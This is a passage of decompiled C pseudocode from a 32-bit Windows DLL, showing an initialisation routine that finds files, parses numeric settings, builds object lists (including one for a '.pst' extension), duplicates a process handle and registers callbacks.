  _DWORD *v11; // eax
  struct _WIN32_FIND_DATAW FindFileData; // [esp+Ch] [ebp-4F4h] BYREF
  int v13[148]; // [esp+25Ch] [ebp-2A4h] BYREF
  int v14; // [esp+4ACh] [ebp-54h] BYREF
  LONG v15; // [esp+4B0h] [ebp-50h] BYREF
  int v16; // [esp+4B4h] [ebp-4Ch] BYREF
  LONG v17; // [esp+4B8h] [ebp-48h] BYREF
  int v18; // [esp+4BCh] [ebp-44h] BYREF
  LONG v19; // [esp+4C0h] [ebp-40h] BYREF
  int v20; // [esp+4C4h] [ebp-3Ch]
  int v21[3]; // [esp+4C8h] [ebp-38h] BYREF
  int v22[2]; // [esp+4D4h] [ebp-2Ch] BYREF
  void *v23[2]; // [esp+4DCh] [ebp-24h] BYREF
  int v24; // [esp+4E4h] [ebp-1Ch] BYREF
  volatile LONG *v25; // [esp+4E8h] [ebp-18h] BYREF
  void *Block; // [esp+4ECh] [ebp-14h] BYREF
  int v27; // [esp+4FCh] [ebp-4h]

  v27 = 0;
  memset(&FindFileData, 0, sizeof(FindFileData));
  FirstFileW = FindFirstFileW(*(LPCWSTR *)(dword_101868A0 + 12), &FindFileData);
  if ( FirstFileW == (HANDLE)-1 )
  {
    v2 = 1;
LABEL_3:
    v27 = -1;
    sub_1000A311(&a1);
    return v2;
  }
  FindClose(FirstFileW);
  Block = (void *)sub_1000DEE8((int)&unk_1018689C, 0x5Cu);
  if ( Block == (void *)-1 )
  {
    v2 = 2;
    goto LABEL_3;
  }
  memset(v13, 0, sizeof(v13));
  sub_1000D17D(&v14, &word_1017A738);
  LOBYTE(v27) = 1;
  sub_1000D17D(&v16, &word_1017A73C);
  LOBYTE(v27) = 2;
  sub_1000D17D(&v18, &word_1017A740);
  LOBYTE(v27) = 3;
  v20 = 0;
  sub_1000728E(v21, 0);
  LOBYTE(v27) = 5;
  sub_10001236(&dword_101868A0, &v17);
  v20 = 0;
  qmemcpy(v13, &FindFileData, sizeof(v13));
  ExtensionW = PathFindExtensionW(FindFileData.cFileName);
  sub_1000D17D(&v24, ExtensionW);
  LOBYTE(v27) = 6;
  sub_10001236((LONG *)&v25, &v19);
  LOBYTE(v27) = 5;
  sub_1000D3AD(&v24);
  v5 = sub_1000D836((int)Block, (int)&unk_1018689C, &v24, 0);
  LOBYTE(v27) = 7;
  sub_10001236(v5 + 1, &v15);
  LOBYTE(v27) = 5;
  sub_1000D3AD(&v24);
  v22[0] = (int)v13;
  v22[1] = 628;
  if ( sub_1002FC83((int)&dword_1018688C, (int)&v18) )
  {
    v6 = operator new(4u);
    Block = v6;
    LOBYTE(v27) = 8;
    if ( v6 )
      v7 = sub_1001200D(v6);
    else
      v7 = 0;
    LOBYTE(v27) = 5;
    sub_1000A7A8((int)v7);
  }
  sub_1000996F(&a1, (int)v23);
  LOBYTE(v27) = 9;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v23[0] + 4))(v23[0]) )
  {
    v8 = (int *)(*(int (__thiscall **)(void *))(*(_DWORD *)v23[0] + 12))(v23[0]);
    v25 = (volatile LONG *)v8[1];
    v24 = *v8;
    v9 = (_DWORD *)v24;
    InterlockedIncrement(v25);
    LOBYTE(v27) = 10;
    sub_1002E596(v22, v9);
    v10 = v23[0];
    if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)v23[0] + 4))() )
    {
      v11 = sub_1000E8EF(&Block);
      LOBYTE(v27) = 11;
      sub_100078FE((int)v11);
    }
    (*(void (__thiscall **)(void *))(*(_DWORD *)v10 + 16))(v10);
    LOBYTE(v27) = 9;
    sub_1000780D(&v24);
  }
  LOBYTE(v27) = 5;
  sub_10007D7A(v23);
  LOBYTE(v27) = 0;
  sub_10008B27(v13);
  v27 = -1;
  sub_1000A311(&a1);
  return 0;
}
// 1018688C: using guessed type int dword_1018688C;
// 101868A0: using guessed type int dword_101868A0;
// 100088B5: using guessed type int var_38[3];

//----- (10008B27) --------------------------------------------------------
void __stdcall sub_10008B27(int *a1)
{
  sub_1000780D(a1 + 155);
  sub_1000D3AD(a1 + 152);
  sub_1000D3AD(a1 + 150);
  sub_1000D3AD(a1 + 148);
}

//----- (10008B83) --------------------------------------------------------
int sub_10008B83(HANDLE hSourceHandle, _DWORD *a2, _DWORD *a3, ...)
{
  int v3; // ecx
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // esi
  int v10; // eax
  unsigned int v11; // edi
  int v12; // eax
  int v13; // eax
  _DWORD *v14; // ecx
  int v15; // eax
  unsigned int v16; // eax
  int v17; // eax
  unsigned int v18; // eax
  int v19; // eax
  unsigned int v20; // eax
  int v21; // eax
  unsigned int v22; // eax
  int v23; // eax
  unsigned int v24; // eax
  int v25; // eax
  void *v26; // eax
  int v27; // eax
  _DWORD *v28; // eax
  _DWORD *v29; // eax
  _DWORD *v30; // eax
  void *v31; // eax
  int v32; // eax
  _DWORD *v33; // eax
  void *v34; // eax
  int v35; // eax
  _DWORD *v36; // eax
  _DWORD *v37; // edi
  _DWORD *v38; // eax
  HANDLE v39; // eax
  DWORD v40; // eax
  volatile LONG *v41; // ecx
  int v42; // eax
  _DWORD *v43; // eax
  volatile LONG *v44; // ecx
  volatile LONG *v45; // ecx
  int v46; // eax
  _DWORD *v47; // eax
  wchar_t *v48; // eax
  wchar_t *v49; // eax
  wchar_t *v50; // eax
  wchar_t *v51; // eax
  wchar_t *v52; // eax
  wchar_t *v53; // eax
  _DWORD *v54; // eax
  volatile LONG *v55; // ecx
  int *v56; // ecx
  int v57; // eax
  _DWORD *v58; // eax
  volatile LONG *v59; // ecx
  int v60; // eax
  _DWORD *v61; // eax
  volatile LONG *v62; // ecx
  int v63; // eax
  _DWORD *v64; // eax
  char v65; // [esp-68h] [ebp-1FCh]
  int v66; // [esp-5Ch] [ebp-1F0h]
  int v67; // [esp-58h] [ebp-1ECh]
  volatile LONG *v68; // [esp-54h] [ebp-1E8h] BYREF
  volatile LONG *v69; // [esp-50h] [ebp-1E4h]
  volatile LONG *v70; // [esp-4Ch] [ebp-1E0h] BYREF
  volatile LONG *v71; // [esp-48h] [ebp-1DCh]
  struct _SYSTEMTIME v72; // [esp-44h] [ebp-1D8h]
  int *v73; // [esp-34h] [ebp-1C8h] BYREF
  int *CurrentProcess; // [esp-30h] [ebp-1C4h]
  volatile LONG *v75; // [esp-2Ch] [ebp-1C0h] BYREF
  volatile LONG *v76; // [esp-28h] [ebp-1BCh]
  volatile LONG *v77; // [esp-24h] [ebp-1B8h] BYREF
  volatile LONG *CurrentProcessId; // [esp-20h] [ebp-1B4h]
  _DWORD v79[2]; // [esp-8h] [ebp-19Ch] BYREF
  int v80; // [esp+0h] [ebp-194h] BYREF
  int v81; // [esp+Ch] [ebp-188h] BYREF
  int v82[29]; // [esp+10h] [ebp-184h] BYREF
  struct _SYSTEMTIME v83; // [esp+84h] [ebp-110h]
  struct _SYSTEMTIME SystemTime; // [esp+94h] [ebp-100h] BYREF
  int v85[4]; // [esp+A4h] [ebp-F0h] BYREF
  int v86[4]; // [esp+B4h] [ebp-E0h] BYREF
  int v87[4]; // [esp+C4h] [ebp-D0h] BYREF
  int v88[4]; // [esp+D4h] [ebp-C0h] BYREF
  void *v89; // [esp+E4h] [ebp-B0h]
  int v90[4]; // [esp+E8h] [ebp-ACh] BYREF
  int v91[4]; // [esp+F8h] [ebp-9Ch] BYREF
  int v92[4]; // [esp+108h] [ebp-8Ch] BYREF
  _DWORD v93[2]; // [esp+118h] [ebp-7Ch] BYREF
  _DWORD v94[2]; // [esp+120h] [ebp-74h] BYREF
  FILETIME FileTime; // [esp+128h] [ebp-6Ch] BYREF
  int v96; // [esp+130h] [ebp-64h] BYREF
  void *v97; // [esp+134h] [ebp-60h]
  void *v98; // [esp+138h] [ebp-5Ch]
  int v99[2]; // [esp+13Ch] [ebp-58h] BYREF
  int v100[2]; // [esp+144h] [ebp-50h] BYREF
  struct _FILETIME v101; // [esp+14Ch] [ebp-48h] BYREF
  unsigned int i; // [esp+154h] [ebp-40h]
  unsigned int n; // [esp+158h] [ebp-3Ch]
  unsigned int j; // [esp+15Ch] [ebp-38h]
  unsigned int k; // [esp+160h] [ebp-34h]
  unsigned int m; // [esp+164h] [ebp-30h]
  int v107[4]; // [esp+168h] [ebp-2Ch] BYREF
  struct HKEY__ phkResult; // [esp+178h] [ebp-1Ch] BYREF
  void *dwHighDateTime; // [esp+17Ch] [ebp-18h]
  HANDLE TargetHandle[2]; // [esp+180h] [ebp-14h] BYREF
  int v111; // [esp+190h] [ebp-4h]
  va_list va; // [esp+1A8h] [ebp+14h] BYREF

  va_start(va, a3);
  TargetHandle[1] = &v80;
  v111 = 1;
  v79[1] = v3;
  v79[0] = v3;
  TargetHandle[0] = v79;
  sub_1000D372(v79, (int)va);
  LOBYTE(v111) = 1;
  sub_10008800(v107, 0x7Cu);
  LOBYTE(v111) = 3;
  if ( v107[1] != 6 )
    goto LABEL_2;
  v5 = (*(int (__thiscall **)(int *, _DWORD))(v107[0] + 44))(v107, 0);
  sub_1000D372(v100, v5);
  LOBYTE(v111) = 4;
  if ( !sub_10004EEB((int)v100) )
  {
LABEL_5:
    LOBYTE(v111) = 3;
    sub_1000D3AD(v100);
LABEL_2:
    LOBYTE(v111) = 1;
    sub_100068A5(v107);
    v111 = -1;
LABEL_3:
    sub_1000D3AD((int *)va);
    return 1;
  }
  v6 = (*(int (__thiscall **)(int *, int))(v107[0] + 44))(v107, 1);
  sub_10001236((LONG *)(v6 + 4), &dword_101868A0);
  v7 = (*(int (__thiscall **)(int *, int))(v107[0] + 44))(v107, 2);
  sub_1000D372(v99, v7);
  LOBYTE(v111) = 5;
  if ( sub_1000DE70((int)&unk_10186834, (int)v99) )
  {
    dword_101842F0 = 0;
  }
  else
  {
    if ( !sub_1000DE70((int)&unk_10186874, (int)v99) )
    {
      LOBYTE(v111) = 4;
      sub_1000D3AD(v99);
      LOBYTE(v111) = 3;
      sub_1000D3AD(v100);
      LOBYTE(v111) = 1;
      sub_100068A5(v107);
      v111 = -1;
      sub_1000D3AD((int *)va);
      return 1;
    }
    dword_101842F0 = 1;
  }
  v8 = (*(int (__thiscall **)(int *, int))(v107[0] + 44))(v107, 3);
  v9 = j___wtol(*(const wchar_t **)(*(_DWORD *)(v8 + 4) + 12));
  v10 = (*(int (__thiscall **)(int *, int))(v107[0] + 44))(v107, 4);
  v11 = j___wtol(*(const wchar_t **)(*(_DWORD *)(v10 + 4) + 12));
  v12 = (*(int (__thiscall **)(int *, int))(v107[0] + 44))(v107, 5);
  v13 = j___wtol(*(const wchar_t **)(*(_DWORD *)(v12 + 4) + 12));
  if ( (unsigned int)(v9 - 10) > 0x50 || v11 > 0x2710 || (unsigned int)(v13 - 100) > 0xEE6B21C )
    goto LABEL_34;
  v14 = (_DWORD *)dword_101842F4;
  *(_DWORD *)(dword_101842F4 + 252) = v9;
  *(_DWORD *)((char *)v14 + 243) = v11;
  v14[64] = v13;
  byte_101842E0 = 1;
  sub_1004DDEE(&v81, (_DWORD *)((char *)v14 + 182), (char *)v14 + 198);
  LOBYTE(v111) = 6;
  v15 = sub_1000838A(&v81, (int)v93);
  LOBYTE(v111) = 7;
  (*(void (__thiscall **)(int *, int))(dword_1018688C[0] + 56))(dword_1018688C, v15);
  LOBYTE(v111) = 6;
  sub_100068A5(v93);
  sub_10006814(v90);
  LOBYTE(v111) = 8;
  for ( i = 0; ; ++i )
  {
    v16 = (*(int (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 162) + 4))(dword_101842F4 + 162);
    if ( i >= v16 )
      break;
    v17 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)(dword_101842F4 + 162) + 44))(dword_101842F4 + 162, i);
    sub_1000D372(&phkResult, v17);
    LOBYTE(v111) = 9;
    if ( !*(_BYTE *)(dword_101842F4 + 160)
      || !(*(unsigned __int8 (__thiscall **)(int *, struct HKEY__ *))(v82[0] + 8))(v82, &phkResult)
      || !sub_1004E439((__int32)&v81, &v81, &phkResult) )
    {
      sub_10007469(v90, (int)&phkResult);
    }
    LOBYTE(v111) = 8;
    sub_1000D3AD(&phkResult.unused);
  }
  sub_10006814(v87);
  LOBYTE(v111) = 10;
  for ( j = 0; ; ++j )
  {
    v18 = (*(int (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 268) + 4))(dword_101842F4 + 268);
    if ( j >= v18 )
      break;
    v19 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)(dword_101842F4 + 268) + 44))(dword_101842F4 + 268, j);
    sub_10007469(v87, v19);
  }
  sub_10006814(v85);
  LOBYTE(v111) = 11;
  for ( k = 0; ; ++k )
  {
    v20 = (*(int (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 76) + 4))(dword_101842F4 + 76);
    if ( k >= v20 )
      break;
    v21 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)(dword_101842F4 + 76) + 44))(dword_101842F4 + 76, k);
    sub_10007469(v85, v21);
  }
  sub_10006814(v88);
  LOBYTE(v111) = 12;
  for ( m = 0; ; ++m )
  {
    v22 = (*(int (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 375) + 4))(dword_101842F4 + 375);
    if ( m >= v22 )
      break;
    v23 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)(dword_101842F4 + 375) + 44))(dword_101842F4 + 375, m);
    sub_10007469(v88, v23);
  }
  sub_10006814(v92);
  LOBYTE(v111) = 13;
  for ( n = 0; ; ++n )
  {
    v24 = (*(int (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 92) + 4))(dword_101842F4 + 92);
    if ( n >= v24 )
      break;
    v25 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)(dword_101842F4 + 92) + 44))(dword_101842F4 + 92, n);
    sub_10007469(v92, v25);
  }
  v101 = sub_1002A02D(*(_DWORD *)(dword_101842F4 + 156));
  FileTime = sub_1002A02D(*(_DWORD *)(dword_101842F4 + 337));
  memset(&SystemTime, 0, sizeof(SystemTime));
  if ( !FileTimeToSystemTime(&FileTime, &SystemTime) )
  {
    LOBYTE(v111) = 12;
    sub_100068A5(v92);
    LOBYTE(v111) = 11;
    sub_100068A5(v88);
    LOBYTE(v111) = 10;
    sub_100068A5(v85);
    LOBYTE(v111) = 8;
    sub_100068A5(v87);
    LOBYTE(v111) = 6;
    sub_100068A5(v90);
    LOBYTE(v111) = 5;
    sub_1004E0F8(&v81);
LABEL_34:
    LOBYTE(v111) = 4;
    sub_1000D3AD(v99);
    goto LABEL_5;
  }
  v83 = SystemTime;
  v26 = operator new(0x3Cu);
  TargetHandle[0] = v26;
  LOBYTE(v111) = 14;
  if ( v26 )
    v27 = sub_1002EBDD(v90, (int)v26, &v101, v92, 0);
  else
    v27 = 0;
  LOBYTE(v111) = 13;
  v28 = sub_1000728E(&phkResult, v27);
  LOBYTE(v111) = 15;
  sub_1000A219(dword_10186854, v28);
  LOBYTE(v111) = 13;
  sub_1000780D(&phkResult);
  TargetHandle[0] = operator new(0x44u);
  LOBYTE(v111) = 16;
  if ( TargetHandle[0] )
    v29 = sub_1002E6B6(
            v87,
            (_DWORD *)TargetHandle[0],
            &v101,
            v92,
            *(_DWORD *)(dword_101842F4 + 260),
            *(_DWORD *)(dword_101842F4 + 264));
  else
    v29 = 0;
  LOBYTE(v111) = 13;
  v30 = sub_1000728E(&phkResult, (int)v29);
  LOBYTE(v111) = 17;
  sub_1000A219(dword_1018683C, v30);
  LOBYTE(v111) = 13;
  sub_1000780D(&phkResult);
  v31 = operator new(0x3Cu);
  TargetHandle[0] = v31;
  LOBYTE(v111) = 18;
  if ( v31 )
    v32 = sub_1002EBDD(v88, (int)v31, &v101, v92, 0);
  else
    v32 = 0;
  LOBYTE(v111) = 13;
  v33 = sub_1000728E(&phkResult, v32);
  LOBYTE(v111) = 19;
  sub_1000A219(dword_1018681C, v33);
  LOBYTE(v111) = 13;
  sub_1000780D(&phkResult);
  sub_10006814(v86);
  LOBYTE(v111) = 20;
  sub_1000D17D(&phkResult, aPst);
  LOBYTE(v111) = 21;
  sub_10007469(v86, (int)&phkResult);
  LOBYTE(v111) = 20;
  sub_1000D3AD(&phkResult.unused);
  phkResult.unused = FileTime.dwLowDateTime;
  dwHighDateTime = (void *)FileTime.dwHighDateTime;
  v34 = operator new(0x3Cu);
  TargetHandle[0] = v34;
  LOBYTE(v111) = 22;
  if ( v34 )
    v35 = sub_1002EBDD(v86, (int)v34, &phkResult, v92, 0);
  else
    v35 = 0;
  LOBYTE(v111) = 20;
  v36 = sub_1000728E(&v96, v35);
  LOBYTE(v111) = 23;
  sub_1000A219(dword_1018682C, v36);
  LOBYTE(v111) = 20;
  sub_1000780D(&v96);
  v37 = operator new(0x5Cu);
  TargetHandle[0] = v37;
  LOBYTE(v111) = 24;
  if ( v37 )
  {
    sub_1002FD81(*(_DWORD *)(dword_101842F4 + 16), v37);
    LOBYTE(v111) = 25;
    *v37 = &off_101032E0;
    sub_1002E147(v37 + 2);
    LOBYTE(v111) = 26;
    v37[11] = 0;
    sub_1000728E(v37 + 12, 0);
    LOBYTE(v111) = 27;
    sub_1001EC12((int)(v37 + 14));
    LOBYTE(v111) = 24;
  }
  else
  {
    v37 = 0;
  }
  LOBYTE(v111) = 20;
  v38 = sub_1000728E(&phkResult, (int)v37);
  LOBYTE(v111) = 29;
  sub_1000A219(&dword_10186824, v38);
  LOBYTE(v111) = 20;
  sub_1000780D(&phkResult);
  if ( hSourceHandle != (HANDLE)-1 )
  {
    TargetHandle[0] = (HANDLE)-1;
    CurrentProcess = (int *)GetCurrentProcess();
    v39 = GetCurrentProcess();
    if ( !DuplicateHandle(v39, hSourceHandle, CurrentProcess, TargetHandle, 0, 0, 2u) )
    {
      LOBYTE(v111) = 13;
      sub_100068A5(v86);
      LOBYTE(v111) = 12;
      sub_100068A5(v92);
      LOBYTE(v111) = 11;
      sub_100068A5(v88);
      LOBYTE(v111) = 10;
      sub_100068A5(v85);
      LOBYTE(v111) = 8;
      sub_100068A5(v87);
      LOBYTE(v111) = 6;
      sub_100068A5(v90);
      LOBYTE(v111) = 5;
      sub_1004E0F8(&v81);
      LOBYTE(v111) = 4;
      sub_1000D3AD(v99);
      LOBYTE(v111) = 3;
      sub_1000D3AD(v100);
      LOBYTE(v111) = 1;
      sub_100068A5(v107);
      v111 = -1;
      goto LABEL_3;
    }
    CurrentProcessId = (volatile LONG *)GetCurrentProcessId();
    v40 = GetCurrentProcessId();
    sub_1000A198((HANDLE *)&dword_10186884, TargetHandle[0], 0, 0, v40, (DWORD)CurrentProcessId);
  }
  TargetHandle[0] = operator new(0x38u);
  LOBYTE(v111) = 30;
  if ( TargetHandle[0] )
  {
    v77 = CurrentProcessId;
    v89 = &v77;
    sub_1000A205(dword_10186854, &v77);
    LOBYTE(v111) = 31;
    v76 = v41;
    v75 = v41;
    v98 = &v75;
    sub_1000A205(&dword_10186824, &v75);
    LOBYTE(v111) = 32;
    LOBYTE(CurrentProcess) = *(_BYTE *)(dword_101842F4 + 161);
    LOBYTE(v111) = 30;
    v42 = sub_1002EE31(
            (int)TargetHandle[0],
            0,
            -1,
            dword_1018688C,
            (int *)dword_10186888,
            (char)CurrentProcess,
            (int)v75,
            v76,
            (int)v77,
            CurrentProcessId);
  }
  else
  {
    v42 = 0;
  }
  LOBYTE(v111) = 20;
  v43 = sub_1000728E(&phkResult, v42);
  LOBYTE(v111) = 33;
  sub_10007469(dword_1018685C, (int)v43);
  LOBYTE(v111) = 20;
  sub_1000780D(&phkResult);
  TargetHandle[0] = operator new(0x68u);
  LOBYTE(v111) = 34;
  if ( TargetHandle[0] )
  {
    v77 = CurrentProcessId;
    v98 = &v77;
    sub_100077CD(&v77);
    LOBYTE(v111) = 35;
    v89 = &v73;
    sub_1000809E(v90, &v73);
    LOBYTE(v111) = 36;
    v72 = v83;
    v71 = v44;
    v70 = v44;
    v97 = &v70;
    sub_1000A205(dword_1018682C, &v70);
    LOBYTE(v111) = 37;
    v69 = v45;
    v68 = v45;
    dwHighDateTime = &v68;
    sub_1000A205(&dword_10186824, &v68);
    LOBYTE(v111) = 38;
    v67 = *(_DWORD *)(dword_101842F4 + 345);
    v66 = *(_DWORD *)(dword_101842F4 + 341);
    v65 = *(_BYTE *)(dword_101842F4 + 161);
    LOBYTE(v111) = 34;
    v46 = sub_1002E794(
            (int)TargetHandle[0],
            v65,
            1,
            (void *)dword_10186888,
            v66,
            v67,
            (int)v68,
            v69,
            (int)v70,
            v71,
            *(int *)&v72.wYear,
            *(int *)&v72.wDayOfWeek,
            *(int *)&v72.wHour,
            *(int *)&v72.wSecond,
            (int)v73,
            (int)CurrentProcess,
            (int)v75,
            (int)v76,
            (int)v77,
            CurrentProcessId);
  }
  else
  {
    v46 = 0;
  }
  LOBYTE(v111) = 20;
  v47 = sub_1000728E(v94, v46);
  LOBYTE(v111) = 39;
  sub_10007469(dword_1018685C, (int)v47);
  LOBYTE(v111) = 20;
  sub_1000780D(v94);
  sub_10006814(v91);
  LOBYTE(v111) = 40;
  v48 = (wchar_t *)sub_1000CC40((int)&unk_1017A750);
  sub_1000D17D(&phkResult, v48);
  LOBYTE(v111) = 41;
  sub_10007469(v91, (int)&phkResult);
  LOBYTE(v111) = 40;
  sub_1000D3AD(&phkResult.unused);
  v49 = (wchar_t *)sub_1000CC40((int)&unk_1017A780);
  sub_1000D17D(&phkResult, v49);
  LOBYTE(v111) = 42;
  sub_10007469(v91, (int)&phkResult);
  LOBYTE(v111) = 40;
  sub_1000D3AD(&phkResult.unused);
  v50 = (wchar_t *)sub_1000CC40((int)&unk_1017A7B4);
  sub_1000D17D(&phkResult, v50);
  LOBYTE(v111) = 43;
  sub_10007469(v91, (int)&phkResult);
  LOBYTE(v111) = 40;
  sub_1000D3AD(&phkResult.unused);
  v51 = (wchar_t *)sub_1000CC40((int)&unk_1017A7E4);
  sub_1000D17D(&phkResult, v51);
  LOBYTE(v111) = 44;
  sub_10007469(v91, (int)&phkResult);
  LOBYTE(v111) = 40;
  sub_1000D3AD(&phkResult.unused);
  v52 = (wchar_t *)sub_1000CC40((int)&unk_1017A814);
  sub_1000D17D(&phkResult, v52);
  LOBYTE(v111) = 45;
  sub_10007469(v91, (int)&phkResult);
  LOBYTE(v111) = 40;
  sub_1000D3AD(&phkResult.unused);
  v53 = (wchar_t *)sub_1000CC40((int)&unk_1017A844);
  sub_1000D17D(&phkResult, v53);
  LOBYTE(v111) = 46;
  sub_10007469(v91, (int)&phkResult);
  LOBYTE(v111) = 40;
  sub_1000D3AD(&phkResult.unused);
  TargetHandle[0] = operator new(0x44u);
  LOBYTE(v111) = 47;
  if ( TargetHandle[0] )
    v54 = sub_1002E6B6(
            v91,
            (_DWORD *)TargetHandle[0],
            &v101,
            v92,
            *(_DWORD *)(dword_101842F4 + 260),
            *(_DWORD *)(dword_101842F4 + 264));
  else
    v54 = 0;
  LOBYTE(v111) = 40;
  sub_1000728E(&v101, (int)v54);
  LOBYTE(v111) = 48;
  TargetHandle[0] = operator new(0x3Cu);
  LOBYTE(v111) = 49;
  if ( TargetHandle[0] )
  {
    v77 = CurrentProcessId;
    dwHighDateTime = &v77;
    sub_1000A205(&v101, &v77);
    LOBYTE(v111) = 50;
    v76 = v55;
    v75 = v55;
    v97 = &v75;
    sub_1000A205(dword_1018683C, &v75);
    LOBYTE(v111) = 51;
    CurrentProcess = v56;
    v73 = v56;
    v98 = &v73;
    sub_1000A205(&dword_10186824, &v73);
    LOBYTE(v111) = 52;
    *(_DWORD *)&v72.wSecond = dword_10186888;
    *(_DWORD *)&v72.wHour = 0;
    v69 = *(volatile LONG **)(dword_101842F4 + 243);
    v70 = *(volatile LONG **)(dword_101842F4 + 247);
    v71 = *(volatile LONG **)(dword_101842F4 + 251);
    *(_DWORD *)&v72.wYear = *(_DWORD *)(dword_101842F4 + 255);
    LOBYTE(v72.wDayOfWeek) = *(_BYTE *)(dword_101842F4 + 259);
    LOBYTE(v111) = 49;
    v57 = sub_1002F174(
            (int)TargetHandle[0],
            (int)v69,
            (int)v70,
            (int)v71,
            *(int *)&v72.wYear,
            v72.wDayOfWeek,
            0,
            (void *)dword_10186888,
            (int)v73,
            CurrentProcess,
            (int)v75,
            v76,
            (int)v77,
            CurrentProcessId);
  }
  else
  {
    v57 = 0;
  }
  LOBYTE(v111) = 48;
  v58 = sub_1000728E(v94, v57);
  LOBYTE(v111) = 53;
  sub_10007469(dword_1018685C, (int)v58);
  LOBYTE(v111) = 48;
  sub_1000780D(v94);
  TargetHandle[0] = operator new(0x38u);
  LOBYTE(v111) = 54;
  if ( TargetHandle[0] )
  {
    v77 = CurrentProcessId;
    dwHighDateTime = &v77;
    sub_1000A205(dword_1018681C, &v77);
    LOBYTE(v111) = 55;
    v76 = v59;
    v75 = v59;
    v97 = &v75;
    sub_1000A205(&dword_10186824, &v75);
    LOBYTE(v111) = 56;
    CurrentProcess = (int *)dword_10186888;
    v73 = 0;
    *(_DWORD *)&v72.wSecond = 0xFFFF;
    *(_DWORD *)&v72.wHour = sub_10029CE9();
    LOBYTE(v111) = 54;
    v60 = sub_1002D19E(
            (int)TargetHandle[0],
            0,
            *(int *)&v72.wHour,
            v72.wSecond,
            v73,
            CurrentProcess,
            (int)v75,
            v76,
            (int)v77,
            CurrentProcessId);
  }
  else
  {
    v60 = 0;
  }
  LOBYTE(v111) = 48;
  v61 = sub_1000728E(v94, v60);
  LOBYTE(v111) = 57;
  sub_10007469(dword_10186844, (int)v61);
  LOBYTE(v111) = 48;
  sub_1000780D(v94);
  TargetHandle[0] = operator new(0x38u);
  LOBYTE(v111) = 58;
  if ( TargetHandle[0] )
  {
    v77 = CurrentProcessId;
    dwHighDateTime = &v77;
    sub_1000A205(dword_1018683C, &v77);
    LOBYTE(v111) = 59;
    v76 = v62;
    v75 = v62;
    v97 = &v75;
    sub_1000A205(&dword_10186824, &v75);
    LOBYTE(v111) = 60;
    CurrentProcess = (int *)dword_10186888;
    v73 = 0;
    *(_DWORD *)&v72.wSecond = 0xFFFF;
    *(_DWORD *)&v72.wHour = sub_10029D4C();
    LOBYTE(v111) = 58;
    v63 = sub_1002D19E(
            (int)TargetHandle[0],
            1u,
            *(int *)&v72.wHour,
            v72.wSecond,
            v73,
            CurrentProcess,
            (int)v75,
            v76,
            (int)v77,
            CurrentProcessId);
  }
  else
  {
    v63 = 0;
  }
  LOBYTE(v111) = 48;
  v64 = sub_1000728E(v94, v63);
  LOBYTE(v111) = 61;
  sub_10007469(dword_10186844, (int)v64);
  LOBYTE(v111) = 48;
  sub_1000780D(v94);
  dword_101842E4 = (int)sub_1000856F;
  dword_101842E8 = (int)sub_10008725;
  dword_101842EC = (int)sub_10008797;
  *a3 = &dword_101842E4;
  *a2 = -1;
  LOBYTE(v111) = 40;
  sub_1000780D(&v101);
  LOBYTE(v111) = 20;
  sub_100068A5(v91);
  LOBYTE(v111) = 13;
  sub_100068A5(v86);
  LOBYTE(v111) = 12;
  sub_100068A5(v92);
  LOBYTE(v111) = 11;
  sub_100068A5(v88);
  LOBYTE(v111) = 10;
  sub_100068A5(v85);
  LOBYTE(v111) = 8;
  sub_100068A5(v87);
  LOBYTE(v111) = 6;
  sub_100068A5(v90);
  LOBYTE(v111) = 5;
  sub_1004E0F8(&v81);
  LOBYTE(v111) = 4;
  sub_1000D3AD(v99);
  LOBYTE(v111) = 3;
  sub_1000D3AD(v100);
  LOBYTE(v111) = 1;
  sub_100068A5(v107);
  v111 = -1;
  sub_1000D3AD((int *)va);
  return 0;
}
// 10008BA2: variable 'v3' is possibly undefined
// 1000936A: variable 'v41' is possibly undefined
// 10009420: variable 'v44' is possibly undefined
// 10009435: variable 'v45' is possibly undefined
// 1000965F: variable 'v55' is possibly undefined
// 10009674: variable 'v56' is possibly undefined
// 10009703: variable 'v59' is possibly undefined
// 1000978B: variable 'v62' is possibly undefined
// 101032E0: using guessed type int (__thiscall *off_101032E0)(void *Block, char);
// 101842E0: using guessed type char byte_101842E0;
// 101842E4: using guessed type int dword_101842E4;
// 101842E8: using guessed type int dword_101842E8;
// 101842EC: using guessed type int dword_101842EC;
// 101842F0: using guessed type int dword_101842F0;
// 101842F4: using guessed type int dword_101842F4;
// 1018681C: using guessed type _DWORD dword_1018681C[2];
// 10186824: using guessed type int dword_10186824;
// 1018682C: using guessed type _DWORD dword_1018682C[2];
// 1018683C: using guessed type _DWORD dword_1018683C[2];
// 10186844: using guessed type _DWORD dword_10186844[4];
// 10186854: using guessed type _DWORD dword_10186854[2];
// 1018685C: using guessed type _DWORD dword_1018685C[4];
// 10186884: using guessed type int dword_10186884;
// 1018688C: using guessed type int dword_1018688C[4];
// 101868A0: using guessed type int dword_101868A0;
// 10008B83: using guessed type _DWORD var_7C[2];
// 10008B83: using guessed type int var_AC[4];
// 10008B83: using guessed type int var_184[29];
// 10008B83: using guessed type int var_D0[4];
// 10008B83: using guessed type int var_F0[4];
// 10008B83: using guessed type int var_C0[4];
// 10008B83: using guessed type int var_8C[4];
// 10008B83: using guessed type int var_E0[4];
// 10008B83: using guessed type _DWORD var_74[2];
// 10008B83: using guessed type int var_9C[4];

//----- (1000990F) --------------------------------------------------------
_DWORD *__thiscall sub_1000990F(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax

  v3 = operator new(0xCu);
  if ( v3 )
  {
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_100FC1B4;
  }
  else
  {
    v3 = 0;
  }
  sub_1000728E(a2, (int)v3);
  return a2;
}
// 100FC1B4: using guessed type int (__thiscall *off_100FC1B4)(void *Block, char);

//----- (1000996F) --------------------------------------------------------
int __thiscall sub_1000996F(void *this, int a2)
{
